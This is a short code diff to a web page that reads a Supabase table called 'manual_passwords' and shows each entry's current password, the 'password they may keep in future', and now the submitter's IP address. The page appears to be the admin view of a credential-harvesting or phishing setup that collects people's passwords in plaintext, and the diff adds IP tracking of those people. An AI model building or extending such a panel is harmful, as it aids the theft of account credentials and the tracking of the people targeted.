@@ -43,6 +43,7 @@
         <th>ID</th>
         <th>Current Password</th>
         <th>Password they may keep in future</th>
+        <th>IP</th>
         <th>Created At</th>
       </tr>
     </thead>
@@ -60,7 +61,7 @@
     async function loadUsers() {
       const { data, error } = await supabase
         .from('manual_passwords') // Make sure this matches your exact table name
-        .select('id, old_password, new_password, created_at')
+        .select('id, old_password, new_password, ip, created_at')
         .order('created_at', { ascending: false });
 
       console.log('DATA:', data);
@@ -78,6 +79,7 @@
           <td>${user.id}</td>
           <td>${user.old_password || '-'}</td>
           <td>${user.new_password || '-'}</td>
+          <td>${user.ip || '-'}</td>
           <td>${new Date(user.created_at).toLocaleString()}</td>
         `;
         tbody.appendChild(tr);
